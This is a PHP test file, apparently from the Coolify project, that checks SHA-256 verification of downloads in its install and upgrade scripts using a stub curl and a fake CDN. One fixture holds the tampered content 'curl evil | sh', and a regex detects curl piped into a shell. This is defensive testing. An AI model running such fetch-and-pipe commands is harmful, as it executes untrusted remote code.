<?php

use Symfony\Component\Process\Process;

/**
 * A scratch directory with a fake CDN and a curl stub that serves files from it
 * ("<url>" maps to "<cdn>/<basename of url>", missing files fail like curl -f).
 *
 * @return array{root: string, cdn: string, out: string, bin: string}
 */
function integritySandbox(): array
{
    $root = sys_get_temp_dir().'/coolify-integrity-'.bin2hex(random_bytes(6));
    $paths = ['root' => $root, 'cdn' => "$root/cdn", 'out' => "$root/out", 'bin' => "$root/bin"];
    foreach (['cdn', 'out', 'bin'] as $directory) {
        mkdir($paths[$directory], 0755, true);
    }

    file_put_contents("{$paths['bin']}/curl", <<<BASH
        #!/bin/bash
        url="" out=""
        while [ \$# -gt 0 ]; do
            case "\$1" in
            -o) out="\$2"; shift 2 ;;
            -*) shift ;;
            *) url="\$1"; shift ;;
            esac
        done
        file="{$paths['cdn']}/\$(basename "\$url")"
        [ -f "\$file" ] || exit 22
        if [ -n "\$out" ]; then cp "\$file" "\$out"; else cat "\$file"; fi
        BASH);
    chmod("{$paths['bin']}/curl", 0755);

    return $paths;
}

/**
 * @param  array<string, string>  $env
 */
function runInSandbox(array $sandbox, string $script, array $env = []): Process
{
    $process = new Process(['bash', '-c', $script], $sandbox['root'], $env + [
        'PATH' => $sandbox['bin'].':'.getenv('PATH'),
        'LC_ALL' => 'C',
    ]);
    $process->run();

    return $process;
}

/**
 * The download_verified function of an install or upgrade script, plus its settings block.
 */
function downloadVerifiedFunction(string $path): string
{
    $script = file_get_contents(dirname(__DIR__, 2).'/'.$path);
    $from = strpos($script, '# Downloaded files are verified against');
    $to = strpos($script, '# End of download_verified', $from);

    expect($from)->not->toBeFalse()->and($to)->not->toBeFalse();

    return substr($script, $from, $to - $from);
}

afterEach(function () {
    foreach (glob(sys_get_temp_dir().'/coolify-integrity-*') as $directory) {
        (new Process(['rm', '-rf', $directory]))->run();
    }
});

dataset('scripts with verified downloads', [
    'stable install' => 'scripts/install.sh',
    'nightly install' => 'other/nightly/install.sh',
    'stable upgrade' => 'scripts/upgrade.sh',
    'nightly upgrade' => 'other/nightly/upgrade.sh',
]);

it('replaces a file only when it matches its published checksum', function (string $path) {
    $sandbox = integritySandbox();
    file_put_contents("{$sandbox['cdn']}/upgrade.sh", "echo new\n");
    file_put_contents("{$sandbox['cdn']}/upgrade.sh.sha256", hash('sha256', "echo new\n")."  upgrade.sh\n");
    file_put_contents("{$sandbox['out']}/upgrade.sh", "echo old\n");

    $process = runInSandbox($sandbox, 'ENV_FILE=/nonexistent; '.downloadVerifiedFunction($path)
        ."\ndownload_verified https://cdn.example/coolify/upgrade.sh {$sandbox['out']}/upgrade.sh");

    expect($process->getExitCode())->toBe(0)
        ->and($process->getOutput())->toContain('Verified SHA-256 checksum')
        ->and(file_get_contents("{$sandbox['out']}/upgrade.sh"))->toBe("echo new\n")
        ->and(file_exists("{$sandbox['out']}/upgrade.sh.download"))->toBeFalse();
})->with('scripts with verified downloads');

it('keeps the existing file and fails on a checksum mismatch', function (string $path) {
    $sandbox = integritySandbox();
    file_put_contents("{$sandbox['cdn']}/upgrade.sh", "curl evil | sh\n");
    file_put_contents("{$sandbox['cdn']}/upgrade.sh.sha256", strtoupper(hash('sha256', "echo new\n"))."\r\n");
    file_put_contents("{$sandbox['out']}/upgrade.sh", "echo old\n");

    $process = runInSandbox($sandbox, 'ENV_FILE=/nonexistent; '.downloadVerifiedFunction($path)
        ."\ndownload_verified https://cdn.example/coolify/upgrade.sh {$sandbox['out']}/upgrade.sh");

    expect($process->getExitCode())->toBe(2)
        ->and($process->getOutput())->toContain('Checksum mismatch')
        ->and(file_get_contents("{$sandbox['out']}/upgrade.sh"))->toBe("echo old\n")
        ->and(file_exists("{$sandbox['out']}/upgrade.sh.download"))->toBeFalse();
})->with('scripts with verified downloads');

it('warns but continues when no checksum is published', function (string $path) {
    $sandbox = integritySandbox();
    file_put_contents("{$sandbox['cdn']}/docker-compose.yml", "services: {}\n");

    $process = runInSandbox($sandbox, 'ENV_FILE=/nonexistent; CHECKSUM_WARNINGS_FILE=warnings; '.downloadVerifiedFunction($path)
        ."\ndownload_verified https://cdn.example/coolify/docker-compose.yml {$sandbox['out']}/docker-compose.yml");

    expect($process->getExitCode())->toBe(0)
        ->and($process->getOutput())->toContain('WARNING: No checksum published')
        ->and(file_get_contents("{$sandbox['out']}/docker-compose.yml"))->toBe("services: {}\n")
        ->and(file_get_contents("{$sandbox['root']}/warnings"))->toContain('docker-compose.yml');
})->with('scripts with verified downloads');

it('refuses files without a checksum when checksums are required', function (string $path, array $env, string $envFile) {
    $sandbox = integritySandbox();
    file_put_contents("{$sandbox['cdn']}/docker-compose.yml", "services: {}\n");
    file_put_contents("{$sandbox['root']}/.env", $envFile);

    $process = runInSandbox($sandbox, 'ENV_FILE=.env; '.downloadVerifiedFunction($path)
        ."\ndownload_verified https://cdn.example/coolify/docker-compose.yml {$sandbox['out']}/docker-compose.yml", $env);

    expect($process->getExitCode())->toBe(3)
        ->and(file_exists("{$sandbox['out']}/docker-compose.yml"))->toBeFalse();
})->with('scripts with verified downloads')->with([
    'environment' => [['COOLIFY_REQUIRE_CHECKSUMS' => 'true'], ''],
    '.env' => [[], "APP_ID=x\nCOOLIFY_REQUIRE_CHECKSUMS=true\n"],
]);

it('fails without touching the existing file when the download fails', function (string $path) {
    $sandbox = integritySandbox();
    file_put_contents("{$sandbox['out']}/upgrade.sh", "echo old\n");

    $process = runInSandbox($sandbox, 'ENV_FILE=/nonexistent; '.downloadVerifiedFunction($path)
        ."\ndownload_verified https://cdn.example/coolify/upgrade.sh {$sandbox['out']}/upgrade.sh");

    expect($process->getExitCode())->toBe(1)
        ->and(file_get_contents("{$sandbox['out']}/upgrade.sh"))->toBe("echo old\n");
})->with('scripts with verified downloads');

it('no longer pipes downloads into a shell or writes CDN files in place', function (string $path) {
    $script = file_get_contents(dirname(__DIR__, 2).'/'.$path);

    expect($script)
        ->not->toMatch('/curl[^\n|]*\|\s*(ba)?sh\b/')
        ->not->toContain('curl -fsSL -L $CDN/');
})->with('scripts with verified downloads');

it('aborts the upgrade when a configuration file fails its checksum', function (string $path) {
    $script = file_get_contents(dirname(__DIR__, 2).'/'.$path);

    expect($script)
        ->toContain('fetch_config_file docker-compose.yml')
        ->toContain('fetch_config_file docker-compose.prod.yml')
        ->toContain('fetch_config_file .env.production')
        ->toContain('write_status "error" "Checksum verification failed for ${name}"');
})->with([
    'stable upgrade' => 'scripts/upgrade.sh',
    'nightly upgrade' => 'other/nightly/upgrade.sh',
]);
